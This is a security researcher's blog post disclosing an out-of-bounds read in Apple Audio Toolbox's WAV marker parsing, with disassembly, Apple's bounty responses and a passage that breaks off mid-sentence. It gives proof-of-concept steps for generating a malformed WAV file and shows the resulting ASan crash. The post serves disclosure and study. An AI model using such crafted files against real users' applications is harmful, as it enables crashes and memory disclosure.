@@ -1,0 +1,265 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>A bug in Apple Audio Toolbox that leads to heap OOB read | ALTV!ST</title><link rel=icon type=image/png href="/favicon-96x96.png?v=20260610" sizes=96x96><link rel=icon type=image/svg+xml href="/favicon.svg?v=20260610"><link rel="shortcut icon" href="/favicon.ico?v=20260610"><link rel=apple-touch-icon sizes=180x180 href="/apple-touch-icon.png?v=20260610"><link rel=manifest href="/site.webmanifest?v=20260610"><link rel=stylesheet href=/styles.css><script>(function(){var e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;document.documentElement.setAttribute("data-theme",e??(t?"dark":"light"))})()</script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&family=Source+Sans+3:ital,wght@0,200..900;1,200..900&display=swap" rel=stylesheet><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/katex.min.css integrity=sha384-WcoG4HRXMzYzfCgiyfrySxx90XSl2rxY5mnVY5TwtWE6KLrArNKn0T/mOgNL0Mmi crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/katex.min.js integrity=sha384-J+9dG2KMoiR9hqcFao0IBLwxt6zpcyN68IgwzsCSkbreXUjmNVRhPFTssqdSGjwQ crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/contrib/auto-render.min.js integrity=sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh crossorigin=anonymous></script><script defer>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],throwOnError:!1})})</script><script defer src=/js/external-links.js></script><script defer src=/js/toc-numbered.js></script><script defer src=/js/menu.js></script><script defer src=/js/theme.js></script></head><body class="typography external-links smooth-fonts"><div class=topbar-wrapper><div class=topbar><div class=logo><a href=/><img src=/ava-big.png>
+ALTV!ST</a></div><div id=menu-buttons><div id=open-menu><i class="fa-solid fa-bars"></i></div><div id=close-menu><i class="fa-solid fa-xmark"></i></div></div><div id=menu><a href=/>Blog</a>
+<a href=/projects/>Projects</a>
+<a href=/contact/>Contact</a>
+<a href=https://github.com/altvist><i class="fa-brands fa-github"></i>
+</a><a href=https://infosec.exchange/@altvist><i class="fa-brands fa-mastodon"></i></a></div></div></div><div id=dropdown-menu><a href=/>Blog</a>
+<a href=/projects/>Projects</a>
+<a href=/contact/>Contact</a><div class=dropdown-menu-icons><a href=https://github.com/altvist><i class="fa-brands fa-github"></i>
+</a><a href=https://infosec.exchange/@altvist><i class="fa-brands fa-mastodon"></i></a></div></div><div class=content><div class=title-wrapper><div class=title>A bug in Apple Audio Toolbox that leads to heap OOB read</div><p class=meta>Jun 13, 2026</p></div><p>Last month, while testing <a href=https://altvi.st/hobo-bn-mcp-v1-1-0/>HOBO BN MCP</a>, I found two very similar vulnerabilities in macOS. I reported both to Apple Product Security through the <a href=https://security.apple.com/bounty/>Apple Security Bounty</a> program — one report per vulnerability. Apple confirmed one of them, and I&rsquo;m now waiting for a CVE and the update that will patch it. Once the patch ships, I&rsquo;ll publish a detailed write-up about that one.</p><p>The second report was rejected: <em>&ldquo;We&rsquo;re unable to identify a security issue in your report.&rdquo;</em> Well — &ldquo;rejected&rdquo; may not be quite the right word. In all likelihood, this second vulnerability will also be fixed in a future update, just silently, with no CVE and no bounty.</p><p>As I mentioned, the two vulnerabilities are very similar, so Apple Product Security&rsquo;s call on the second one came as an unpleasant surprise. But I&rsquo;m not going to argue with Apple in this post. Instead, I&rsquo;ll walk through the second vulnerability in detail and, at the end, share a few thoughts on why Apple Product Security might not have identified it as a security issue.</p><div id=toc></div><h1>Markers in audio files</h1><p>Let me back up a bit and start with markers in audio files.</p><h2>What are markers?</h2><p>Markers are special timestamped reference points used to flag specific moments in an audio recording. They act as &ldquo;bookmarks&rdquo; — helping you navigate a track, simplifying editing, or automating transitions. Markers are metadata; they don&rsquo;t change the recorded audio itself.</p><p>There&rsquo;s no single standard, even on paper, that defines what metadata a marker can contain or how it&rsquo;s encoded at the byte level. It all depends on the audio file format:</p><ul><li><p>Some formats don&rsquo;t support markers at all — for example, MP3 (MPEG-1 Audio Layer 3) or OGG (Ogg Vorbis).</p></li><li><p>Among formats that do support markers, there are two broad approaches:</p><ul><li>the RIFF WAVE <code>'cue '</code> chunk (the Microsoft world; <a href=#the-cue-chunk-in-wav-riff>details below</a>)</li><li>the AIFF Marker Chunk (the Apple world)</li></ul><p>But even within these broad approaches, marker support — what they contain and how they&rsquo;re encoded at the byte level — can depend on:</p><ul><li>the specific audio format</li><li>a specific variant of that format (e.g. compressed vs. uncompressed AU)</li><li>or even the specific software that created the marker</li></ul></li></ul><p>The world of audio formats is fairly chaotic. There&rsquo;s a certain beauty in that, but it can cause real problems during development. An example follows in the next section.</p><h2>Audio Toolbox and a typical pattern for reading markers</h2><p>Suppose a developer needs to read markers from an audio file whose format isn&rsquo;t known in advance. Sure, you could write a couple dozen parsers from scratch for the most commonly used audio formats — the hardcore path of a true samurai.</p><p>But for some reason, most people don&rsquo;t rush down that road. Most developers reach for libraries written by someone else instead. On Apple&rsquo;s operating systems (macOS / iOS / tvOS / …) it&rsquo;s especially easy: there&rsquo;s a system framework called <a href=https://developer.apple.com/documentation/audiotoolbox>Audio Toolbox</a>. Among many other things, it provides two functions:</p><ul><li><p><a href=https://developer.apple.com/documentation/audiotoolbox/audiofilegetpropertyinfo%28_:_:_:_:%29><code>AudioFileGetPropertyInfo</code></a> gets information about an audio file property, including the size of the property value in bytes and whether the value is writable. When called with <code>inPropertyID</code> set to <a href=https://developer.apple.com/documentation/audiotoolbox/kaudiofilepropertymarkerlist><code>kAudioFilePropertyMarkerList</code></a>, the function returns the size of the buffer needed to store markers read from the file.</p></li><li><p><a href=https://developer.apple.com/documentation/audiotoolbox/audiofilegetproperty%28_:_:_:_:%29><code>AudioFileGetProperty</code></a> gets the value of an audio file property. When called with <code>inPropertyID</code> set to <a href=https://developer.apple.com/documentation/audiotoolbox/kaudiofilepropertymarkerlist><code>kAudioFilePropertyMarkerList</code></a>, it reads the markers from the file into the supplied buffer.</p></li></ul><p>The typical pattern for using these two functions to read markers stays the same and gets copied from one project to another:</p><ol><li><p>Open the audio file.</p></li><li><p>Call <code>AudioFileGetPropertyInfo</code> with <code>kAudioFilePropertyMarkerList</code>, passing the <code>AudioFileID</code> of the opened file. In return, the function tells us the buffer size required for an <a href=https://developer.apple.com/documentation/audiotoolbox/audiofilemarkerlist><code>AudioFileMarkerList</code></a>.</p></li><li><p>Allocate a buffer of that size — sometimes on the stack, but more often on the heap, since a file can contain many markers and they may not fit on the stack. If you&rsquo;re allocating in C++ <code>new[]</code> style and need a type-plus-count rather than an absolute size in bytes, use <a href=https://developer.apple.com/documentation/audiotoolbox/numbytestonumaudiofilemarkers(_:)><code>NumBytesToNumAudioFileMarkers</code></a> to convert the byte size into a marker count.</p></li><li><p>Call <code>AudioFileGetProperty</code> with <code>kAudioFilePropertyMarkerList</code>, passing:</p><ul><li>the <code>AudioFileID</code> of the opened file</li><li>the address and size of the buffer we allocated for the <code>AudioFileMarkerList</code></li></ul><p>In return, the function gives us:</p><ul><li>the number of bytes actually written to the buffer</li><li>an <code>AudioFileMarkerList</code> object filled into that same buffer</li></ul></li><li><p>From here it&rsquo;s straightforward. The <code>AudioFileMarkerList</code> has, among other fields, two we care about:</p><ul><li>the number of markers read from the file: <code>mNumberMarkers</code></li><li>the markers themselves: <code>mMarkers</code>, indexed from <code>0</code> to <code>mNumberMarkers - 1</code></li></ul></li></ol><p>Here&rsquo;s one possible implementation of this pattern in C:</p><pre tabindex=0><code>/*
+    Getting the size of a buffer for the marker list
+    (afid is an AudioFileID handle for some opened audio file)
+*/
+UInt32 size = 0;
+UInt32 writable = 0;
+s = AudioFileGetPropertyInfo(afid, kAudioFilePropertyMarkerList, &amp;size, &amp;writable);
+if (s != noErr || size == 0) {
+    fprintf(
+        stderr, &#34;[FAIL] AudioFileGetPropertyInfo returned size=%u writable=%u OSStatus=%d\n&#34;,
+        size, writable, (int)s
+    );
+    AudioFileClose(afid);
+    return 1;
+}
+
+/*
+    Allocating a buffer of the size we got
+    by calling AudioFileGetPropertyInfo
+*/
+AudioFileMarkerList *list = malloc(size);
+if (!list) {
+    fprintf(stderr, &#34;[FAIL] malloc(%u) returned NULL\n&#34;, size);
+    AudioFileClose(afid);
+    return 1;
+}
+
+/*
+    Getting the list of markers
+*/
+UInt32 io = size;
+s = AudioFileGetProperty(afid, kAudioFilePropertyMarkerList, &amp;io, list);
+printf(
+    &#34;[INFO] AudioFileGetProperty returned io=%u list-&gt;mNumberMarkers=%u OSStatus=%d\n\n&#34;,
+    io, list-&gt;mNumberMarkers, (int)s
+);
+</code></pre><p>You&rsquo;ll see code like this in many real-world projects. An example follows.</p><h2>The pattern in a real-world project</h2><p>For instance, <a href=https://github.com/AudioKit/AudioKit/tree/v4>AudioKit v4.11</a> (11.4k stars / 1.6k forks on GitHub) carries an in-house fork of <a href=https://github.com/syedhali/EZAudio>EZAudio</a> (5k stars / 817 forks on GitHub) under the hood. It contains <a href=https://github.com/AudioKit/AudioKit/blob/7ba73700269849109f5d83a6ce397ef6f65acbc9/AudioKit/Common/Internals/EZAudio/EZAudioFile.m#L592>the following Objective-C code</a>:</p><pre tabindex=0><code>// return the markers in this file. This will be a NSArray of
+/// EZAudioFileMarkers for Swift compatibility
+- (NSArray *)markers
+{
+    // get size of markers property (dictionary)
+    UInt32 propSize;
+    UInt32 writable;
+    OSStatus error = noErr;
+
+    error = AudioFileGetPropertyInfo(self.audioFileID,
+                                     kAudioFilePropertyMarkerList,
+                                     &amp;propSize,
+                                     &amp;writable);
+
+    // returning NULL is more useful when called from swift
+    if (error != noErr) {
+        return NULL;
+    }
+
+    size_t length = NumBytesToNumAudioFileMarkers(propSize);
+
+    if (length == 0) {
+        return NULL;
+    }
+
+    // allocate enough space for the markers.
+    AudioFileMarkerList markerList[ length ];
+
+    // pull marker list
+    error = AudioFileGetProperty(self.audioFileID,
+                                 kAudioFilePropertyMarkerList,
+                                 &amp;propSize,
+                                 &amp;markerList);
+    if (error != noErr) {
+        return NULL;
+    }
+
+    // NSLog(@&#34;# of markers: %d\n&#34;, markerList-&gt;mNumberMarkers );
+
+    // the native C structs aren&#39;t so friendly with Swift, so we&#39;ll load up an array instead
+    NSMutableArray *array = [NSMutableArray arrayWithCapacity:markerList-&gt;mNumberMarkers];
+
+    int i;
+    for (i = 0; i &lt; markerList-&gt;mNumberMarkers; i++) {
+    ...
+</code></pre><p>You can find similar code in other projects that work with audio markers. A GitHub code search for <code>kAudioFilePropertyMarkerList</code> will turn up plenty of examples.</p><p><strong>If you&rsquo;ve made it this far</strong> but still don&rsquo;t see why you need to know so much about markers, the typical code patterns for handling them, or where any vulnerability could possibly fit in — bear with me one more section. Once we&rsquo;ve covered the <code>'cue '</code> chunk in WAV, we&rsquo;ll (finally!) get to the bugs in the Audio Toolbox code, and then to the vulnerability Apple declined.</p><h2>The <code>'cue '</code> chunk in WAV (RIFF)</h2><p>WAV files store their data in so-called &ldquo;chunks.&rdquo; To carry markers, the format defines a special <a href=https://www.recordingblogs.com/wiki/cue-chunk-of-a-wave-file><code>'cue '</code> chunk</a>. At the byte level, the <code>'cue '</code> chunk has the following structure:</p><pre tabindex=0><code>#define CueID &#39;cue &#39;  /* chunk ID for Cue Chunk */
+
+typedef struct {
+  ID        chunkID;
+  long      chunkSize;
+  long      dwCuePoints;
+  CuePoint  points[];
+} CueChunk;
+</code></pre><p>Where:</p><ul><li><code>chunkID</code> is a four-byte ASCII string, always <code>'cue '</code> — yes, exactly like that, with a trailing space.</li><li><code>chunkSize</code> is the number of bytes in the chunk, not counting the 8 bytes used by the <code>chunkID</code> and <code>chunkSize</code> fields themselves.</li><li><code>dwCuePoints</code> is the number of <code>CuePoint</code> structures in the Cue chunk. The important thing here is that <code>dwCuePoints</code> is <strong>fully attacker-controlled</strong> — a crafted WAV file can specify any value at all.</li><li><code>points</code> is an array of <code>CuePoint</code> structures, with <code>dwCuePoints</code> elements in it.</li><li>Each <code>CuePoint</code> is 24 bytes long. That&rsquo;s all we need to know about it here — if you want the full layout, see <a href=https://www.recordingblogs.com/wiki/cue-chunk-of-a-wave-file>here</a> or <a href=http://midi.teragonaudio.com/tech/wave.htm>here</a>.</li></ul><p>The <code>'cue '</code> chunk is optional, and a WAV file can contain at most one of them.</p><h1>The Vulnerability in Audio Toolbox</h1><p>We finally arrive at the bugs Apple&rsquo;s developers introduced in Audio Toolbox, and at the vulnerability that follows from them.</p><p><strong>Important note before we wade into the ARMv8-A assembly!</strong> All the machine code in this section, and all offsets within it, come from disassembling Audio Toolbox as it ships in <code>dyld_shared_cache_arm64e</code> on macOS 26.5.1 (the latest macOS at the time of writing this post):</p><pre tabindex=0><code>/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
+(sha256=2d5ec323938a842298610eb66a51e2307a2e10a220b26432672c7c4f8e7256a9)
+</code></pre><h2>The bug in <code>WAVEAudioFile::GetMarkerListSize</code></h2><p>The first bug HOBO BN MCP turned up sits in the undocumented method <code>int64_t WAVEAudioFile::GetMarkerListSize(unsigned int*, unsigned int*)</code> inside Audio Toolbox. This is the method that <code>AudioFileGetPropertyInfo</code> calls under the hood to compute the marker buffer size, when invoked with <code>kAudioFilePropertyMarkerList</code> and a WAV file.</p><p>The buffer size returned by this undocumented method is computed by the formula</p><pre tabindex=0><code>8 + dwCuePoints * 0x28 (mod 2^32)
+</code></pre><p>where <code>dwCuePoints</code> is read straight from the <a href=#the-cue-chunk-in-wav-riff>WAV file</a>. The corresponding machine code:</p><pre tabindex=0><code>int64_t WAVEAudioFile::GetMarkerListSize(unsigned int*, unsigned int*) + 208:
+
+    ldr     w8, [sp, #0xc]   ; w8 = dwCuePoints (from the WAV file)
+    mov     w9, #0x28        ; w9 = 40
+    mov     w10, #0x8        ; w10 = 8
+    madd    w8, w8, w9, w10  ; w8 = w8 * w9 + w10 &lt;== 8 + dwCuePoints * 0x28 (mod 2^32)
+    str     w8, [x19]        ; *bufferSize = w8
+
+    ...
+</code></pre><p>Once the buffer size is computed, the result should have been sanity-checked against — at the very least — <code>chunkSize</code> and the size of the WAV file itself. But the Audio Toolbox code does no such thing. The undocumented <code>WAVEAudioFile::GetMarkerListSize</code>, and <code>AudioFileGetPropertyInfo</code> on top of it, simply return whatever value the formula produced, as is. That lets a WAV file of less than 100 KB set <code>dwCuePoints</code> to <code>0xFFFFFFFF</code> and trick <code>AudioFileGetPropertyInfo</code> into reporting a giant buffer size:</p><pre tabindex=0><code>8 + 0xFFFFFFFF * 0x28 (mod 2^32) = 0xFFFFFFE0 ; 4 GiB - 32 bytes
+</code></pre><h2>The bug in <code>AudioFileGetProperty</code></h2><p>The second Audio Toolbox bug lives in the undocumented method <code>int64_t WAVEAudioFile::GetMarkerList(uint32_t*, AudioFileMarkerList*, bool)</code>. This method is called under the hood by <code>AudioFileGetProperty</code> to read markers into the supplied buffer, when invoked with <code>kAudioFilePropertyMarkerList</code> and a WAV file.</p><p>The relevant assembly:</p><pre tabindex=0><code>int64_t WAVEAudioFile::GetMarkerList(uint32_t*, AudioFileMarkerList*, bool) + 228:
+
+    ; w8 = caller buffer size in bytes
+    ldr     w8, [x20]
+
+    ; w8 -= 8 (skip header)
+    subs    w8, w8, #0x8
+
+    ; w9 = 0xcccccccd
+    mov     w9, #0xcccd
+    movk    w9, #0xcccc, lsl #0x10  {0xcccccccd}
+
+    ; x8 = w8 * w9 (UNSIGNED multiply)
+    umull   x8, w8, w9
+
+    ; x8 = x8 &gt;&gt; 37
+    ; so
+    ; w8 = (buffer size - 8) / 40 (UNSIGNED div by 0x28)
+    lsr     x8, x8, #0x25
+
+    ; if sz &lt; 8 (UNSIGNED comparison), then w8 = 0
+    csel    w8, wzr, w8, cc  {0x0}
+
+    ; w9 = dwCuePoints (read from file)
+    ldp     w23, w9, [sp, #0x38] {var_68} {var_68+0x4}
+
+    ; SIGNED w26 = min(w9, w8)
+    cmp     w9, w8
+    csel    w26, w9, w8, lt
+
+    ; outList-&gt;mSMPTE_TimeType = 0
+    ; outList-&gt;mNumberMarkers  = w26
+    stp     wzr, w26, [x21]  {0x0}
+
+    ...
+
+int64_t WAVEAudioFile::GetMarkerList(uint32_t*, AudioFileMarkerList*, bool) + 324:
+
+    ; SIGNED comparison and...
+    cmp    w26, #0x1
+
+    ; ...early-exit (skips marker writes)
+    b.lt   0x186449b24    ; &lt;+540&gt;
+
+    ...
+
+int64_t WAVEAudioFile::GetMarkerList(uint32_t*, AudioFileMarkerList*, bool) + 540:
+
+    ; exit, no errors
+    mov    w25, #0x0 ; =0
+
+    ...
+</code></pre><p>When a malicious WAV sets <code>dwCuePoints</code> with the high bit set (e.g. <code>0xFFFFFFFF</code>):</p><ol><li><p>The signed <code>min(fileN, bufCap)</code> picks <code>fileN</code> (it looks negative):</p><pre tabindex=0><code>cmp     w9, w8
+csel    w26, w9, w8, lt
+</code></pre></li><li><p><code>outList->mNumberMarkers</code> is committed to the caller-visible struct as that huge value:</p><pre tabindex=0><code>; outList-&gt;mSMPTE_TimeType = 0
+; outList-&gt;mNumberMarkers  = w26
+stp     wzr, w26, [x21]  {0x0}
+</code></pre></li><li><p>The signed <code>&lt; 1</code> short-circuit then skips the per-marker write loop — so no buffer overflow occurs <em>inside</em> this function:</p><pre tabindex=0><code>; SIGNED comparison and...
+cmp    w26, #0x1
+
+; ...early-exit (skips marker writes)
+b.lt   0x186449b24    ; &lt;+540&gt;
+</code></pre></li><li><p>The function returns <code>noErr</code>:</p><pre tabindex=0><code>; exit, no errors
+mov    w25, #0x0 ; =0
+</code></pre></li></ol><p>So the undocumented <code>WAVEAudioFile::GetMarkerList</code>, and through it <code>AudioFileGetProperty</code>, report an incorrect — far larger than what fits in the buffer — number of markers in the <code>mNumberMarkers</code> field of the returned <code>AudioFileMarkerList</code>. And once again, the Audio Toolbox code doesn&rsquo;t even try to check whether that many markers could possibly fit inside the <code>'cue '</code> chunk, let alone inside the WAV file as a whole.</p><h2>Bugs + typical usage pattern = heap OOB read</h2><p>So what happens if a WAV file has <code>dwCuePoints</code> set to <code>0xFFFFFFFF</code> and we try to read markers from it through <code>AudioFileGetPropertyInfo</code> / <code>AudioFileGetProperty</code>? Knowing the bugs from the previous sections, and knowing <a href=#audio-toolbox-and-a-typical-pattern-for-reading-markers>the typical usage pattern</a> for these two functions, the sequence is easy to predict:</p><ol><li><p>We call <code>AudioFileGetPropertyInfo</code> first, and it returns a buffer size of <code>0xFFFFFFE0</code> — a mere 32 bytes short of 4 GiB!</p></li><li><p>If we then try to allocate a buffer of that size on the stack, <a href=#the-pattern-in-a-real-world-project>the way AudioKit does</a>, this most likely ends in DoS.</p><p>On the heap, however, an allocation of that size usually doesn&rsquo;t cause a DoS — at least not on reasonably modern hardware. On my MacBook Air M1 2021 with 8 GiB of RAM, the <code>malloc</code> call goes through fine, the memory gets committed, and execution carries on.</p></li><li><p>Next we call <code>AudioFileGetProperty</code>, passing in the buffer size we just got. The call hands us back an <code>AudioFileMarkerList</code> object with <code>mNumberMarkers</code> equal to <code>4294967295</code>. Fitting that many markers would require a buffer of roughly 160 GiB — about 156 GiB more than our miserable ~4 GiB.</p></li></ol><p>And now, what happens if we try to grab the last marker from the <code>mMarkers[]</code> array of our <code>AudioFileMarkerList</code> object? A heap OOB read happens — because the address of that last element lands <strong>far past</strong> the end of the buffer we allocated. The PoC in the next section demonstrates exactly this scenario.</p><h2>PoC</h2><p>This part is straightforward:</p><ol><li><p>Make sure your host is running the latest macOS (26.5.1 at the time of writing this post).</p></li><li><p>Make sure you have Python 3.6+ and clang installed.</p></li><li><p>Clone the <a href=https://github.com/altvist/apple-audio-toolbox-oob-read-poc>PoC</a> from GitHub:</p><pre tabindex=0><code>git clone https://github.com/altvist/apple-audio-toolbox-oob-read-poc.git
+</code></pre></li><li><p>Generate a minimal malformed WAV that triggers the bug:</p><pre tabindex=0><code>cd apple-audio-toolbox-oob-read-poc/poc/
+python3 make_bad_wav.py bad_cue.wav
+</code></pre><p>The expected result is <code>bad_cue.wav</code> in <code>poc/</code>.</p></li><li><p>Build the minimal PoC harness with ASan:</p><pre tabindex=0><code>clang -fsanitize=address -g -O0 poc_get_marker_list.c \
+    -framework AudioToolbox -framework CoreFoundation \
+    -o poc_get_marker_list
+</code></pre><p>The expected result is <code>poc_get_marker_list</code> in <code>poc/</code>.</p></li></ol><p>Now you can run the PoC:</p><pre tabindex=0><code>./poc_get_marker_list bad_cue.wav
+</code></pre><p>I deliberately wrote the PoC so that it explains what&rsquo;s happening inside as it runs. You should see something along the lines of:</p><pre tabindex=0><code>== STEP #1 ==
+
+Getting file path from the command line by calling
+  CFURLRef url = CFURLCreateFromFileSystemRepresentation(NULL, (const UInt8 *)argv[1], strlen(argv[1]), false)... DONE
+
+== STEP #2 ==
+
+Opening the file by calling AudioFileOpenURL(url, kAudioFileReadPermission, 0, &amp;afid)... DONE
+
+AudioFileOpenURL returned afid=0x9eff000 OSStatus=0
+
+We have opened the file!
+
+== STEP #3 ==
+
+Getting the size of the buffer for the marker list by calling
+  AudioFileGetPropertyInfo(afid, kAudioFilePropertyMarkerList, &amp;size, &amp;writable)... DONE
+
+AudioFileGetPropertyInfo returned size=4294967264 writable=1 OSStatus=0
+
+AudioFileGetPropertyInfo told us the buffer size for the list of markers should be 4294967264 bytes!
+
+== STEP #4 ==
+
+Allocating buffer of size=4294967264 bytes (exactly the size AudioFileGetPropertyInfo told us)
+by calling AudioFileMarkerList *list = malloc(size)... DONE
+
+We&#39;ve allocated the buffer [0x300004800 ... 0x4000047e0] for the marker list of the size 4294967264 bytes
+(exactly the size AudioFileGetPropertyInfo told us). So far so good.
+
+== STEP #5 ==
+
+Getting the list of markers by calling
+  AudioFileGetProperty(afid, kAudioFilePropertyMarkerList, &amp;io, list)
+with io=size and the allocated buffer for marker list (see previous steps)... DONE
+
+AudioFileGetProperty returned io=4294967264 list-&gt;mNumberMarkers=4294967295 OSStatus=0
+
+On Step #3, AudioFileGetPropertyInfo told us the buffer size for the
+list of markers should be 4294967264 bytes (see above), so we allocated the buffer.
+Moreover, AudioFileGetProperty has just told us that 4294967264 bytes were read to the buffer.
+
+IMPORTANT! At the same time, AudioFileGetProperty has just told us that the number of
+the markers in the buffer is list-&gt;mNumberMarkers=4294967295. Each marker is sizeof(AudioFileMarker)=40 bytes.
+So, the size of the buffer for the list of markers should be at least
+  sizeof(AudioFileMarkerList) + (mNumberMarkers - 1) * sizeof(AudioFileMarker)
+or approximately 8 + 40 * 4294967295 = 171798691808 bytes.
+This is 167503724544 bytes more than the size of the buffer we allocated.
+
+== STEP #6 ==
+
+To demonstrate OOB read, let&#39;s try to access the last element of the buffer list:
+
+  list-&gt;mMarkers[list-&gt;mNumberMarkers - 1]
+
+The address of the last element is so far over the end of the buffer
+AudioFileGetPropertyInfo told us to allocate that ASan will report
+&#34;BUS on unknown address&#34; instead of the usual OOB message: the address is
+far from any mapped memory region, which demonstrates how large this OOB read
+is and makes the vulnerability even more serious.
+
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==40703==ERROR: AddressSanitizer: BUS on unknown address (pc 0x00018366b504 bp 0x00016d322990 sp 0x00016d322140 T0)
+==40703==The signal is caused by a READ memory access.
+==40703==Hint: this fault was caused by a dereference of a high value address (see register values below).  Disassemble the provided pc to learn which register was used.
+    #0 0x00018366b504 in _platform_memmove+0x1a4 (libsystem_platform.dylib:arm64e+0x3504)
+    #1 0x000102add284 in main poc_get_marker_list.c:158
+    #2 0x0001832a3dfc in start+0x1b4c (dyld:arm64e+0x1fdfc)
+
+==40703==Register values:
+ x[0] = 0x000000016d322b88   x[1] = 0x0000002b000047b8   x[2] = 0x0000000000000020   x[3] = 0x000000016d322b88  
+ x[4] = 0x0000000102ade140   x[5] = 0x000000016d3229a0   x[6] = 0x000000016cb28000   x[7] = 0x0000000000000001  
+ x[8] = 0x000000702da84575   x[9] = 0x000000016d322baf  x[10] = 0x000000702da84571  x[11] = 0x000000002da64571  
+x[12] = 0x000000002da64575  x[13] = 0x0000000000000000  x[14] = 0x0000000000000000  x[15] = 0x0000000000000000  
+x[16] = 0x000000018366b360  x[17] = 0x0000000103558548  x[18] = 0x0000000000000000  x[19] = 0x0000002b000047b8  
+x[20] = 0x00000001ef52c100  x[21] = 0x0000000104749780  x[22] = 0x0000000000000000  x[23] = 0x00000001ef7e3760  
+x[24] = 0x0000000000000001  x[25] = 0x000000016d322e10  x[26] = 0x00000001ef7e3770  x[27] = 0x0000000000000000  
+x[28] = 0x0000000000000000     fp = 0x000000016d322990     lr = 0x00000001034ea97c     sp = 0x000000016d322140  
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: BUS (libsystem_platform.dylib:arm64e+0x3504) in _platform_memmove+0x1a4
+==40703==ABORTING
+zsh: abort      ./poc_get_marker_list bad_cue.wav
+</code></pre><p>Notice how far the last element of <code>mMarkers</code> is from the end of the allocated buffer — far enough that ASan reports &ldquo;BUS on unknown address&rdquo; instead of a regular OOB read.</p><img src=crash.jpg alt><h2>How dangerous is this vulnerability?</h2><p>From an attacker&rsquo;s perspective, this vulnerability has several attractive properties:</p><ul><li>If the marker buffer is allocated on the heap, the bug reproduces reliably on essentially every reasonably modern device (the only real exception being low-memory devices like emulators).</li><li>An OOB read of up to 156 GiB (!) past the end of the allocated buffer.</li><li>The vulnerability is hard to catch with standard analysis tools, so it could have lived under Apple Product Security&rsquo;s radar for quite a while.</li></ul><p>On the other hand, there are real limitations:</p><ul><li>On its own, this vulnerability isn&rsquo;t enough for, say, RCE. Turning it into a full RCE exploit would need additional bugs to build the chain.</li><li>If the buffer is allocated on the stack rather than the heap, the best (worst?) an attacker can achieve is DoS.</li><li>Niche attack surface. The functions <code>AudioFileGetPropertyInfo</code> and <code>AudioFileGetProperty</code> are called by a relatively limited class of applications, mostly various audio editors and converters that are unlikely to be installed on an average user&rsquo;s or corporate device.</li></ul><p>And, in principle, developers don&rsquo;t have to take <code>AudioFileGetPropertyInfo</code> and <code>AudioFileGetProperty</code> purely on faith — they could add a few sanity checks of their own (does it really make sense for a 100 KB WAV file to claim 4,294,967,295 markers?). But across the dozen-or-so audio software projects I went through, I didn&rsquo;t find a single one doing that — they all followed <a href=#audio-toolbox-and-a-typical-pattern-for-reading-markers>the typical pattern from above</a>, with only minor variations. I&rsquo;m not blaming the developers here at all. Honestly, after reading Apple&rsquo;s official documentation, it&rsquo;s hard to imagine what other pattern you might come up with.</p><h1>Filing a Bug Report via Apple Security Bounty</h1><p>At the start of this post I mentioned that I reported the vulnerability to Apple. In this section I&rsquo;ll briefly walk through the timeline of what happened, and offer a few thoughts on why my report was rejected.</p><h2>A few words about Apple Security Bounty</h2><p>Apple Security Bounty is a fairly primitive (and, ironically, somewhat buggy) issue tracker located at <a href=https://security.apple.com/>https://security.apple.com/</a>. Anyone with an Apple ID can log in and file a bug report.</p><p>&ldquo;Filing a bug report&rdquo; means creating an issue in this tracker and describing the vulnerability in free-form text. From there, Apple Product Security takes over, the issue starts moving through statuses, and you watch it go. You can also leave comments in the issue, clarify details, and ask Apple Product Security questions (they even answer sometimes).</p><p>In theory, every change in your issue — status update, new comment, and so on — is supposed to come with an email notification. In practice, the notifications often break, so you end up logging into the tracker by hand from time to time just to check for updates. That&rsquo;s why some of the dates in the timeline below are when I logged in and saw the update, not necessarily when it actually happened.</p><h2>Timeline</h2><ul><li><p><strong>May 23, 2026.</strong> I created the issue, described the vulnerability in detail, and attached a PoC. The status changed the same day to <em>&ldquo;We&rsquo;re reviewing your report.&rdquo;</em></p></li><li><p><strong>Jun 06, 2026.</strong> I logged in to check the issue. It had been closed, with the status <em>&ldquo;We are unable to identify a security issue in your report.&rdquo;</em> No comment from Apple.</p><p>I posted a comment: <em>&ldquo;So heap OOB read is not a security issue. Interesting&mldr; Anyway, thanks for the review. The good thing here is I can publish the finding in my blog. If, according to your review, it is not a vulnerability, then there is no ethical problem here.&rdquo;</em></p></li><li><p><strong>Jun 07, 2026.</strong> Apple Product Security silently reopened the issue, moving it back to <em>&ldquo;We&rsquo;re reviewing your report.&rdquo;</em></p></li><li><p><strong>Jun 08, 2026.</strong> Apple Product Security closed the issue again. Along with a comment:</p><p><em>&ldquo;Thanks for your response. We don&rsquo;t treat out-of-bounds reads as categorically out of scope. Our review is based on the impact a submission demonstrates. Your proof of concept shows the out-of-bounds condition being reached, but it does not demonstrate a security boundary being crossed, such as disclosure of the out-of-bounds memory to an attacker or code execution. The impact shown is a process crash.&rdquo;</em></p><img src=apple-answer.jpg alt><p>I thanked them politely and let them know I&rsquo;d publish the details in a post on my blog within the next two weeks.</p></li></ul><p>Which is the post you&rsquo;re reading right now.</p><h2>Why Apple rejected the report</h2><p>Honestly, I don&rsquo;t know. I only have a few guesses:</p><ol><li>Apple isn&rsquo;t particularly bothered by a DoS or OOB read that occurs outside of code Apple itself wrote (even if code Apple <em>did</em> write is the direct cause of that OOB read).</li><li>The niche attack surface, combined with the fact that this vulnerability on its own isn&rsquo;t enough for something &ldquo;big&rdquo; like RCE, significantly lowers its value in the 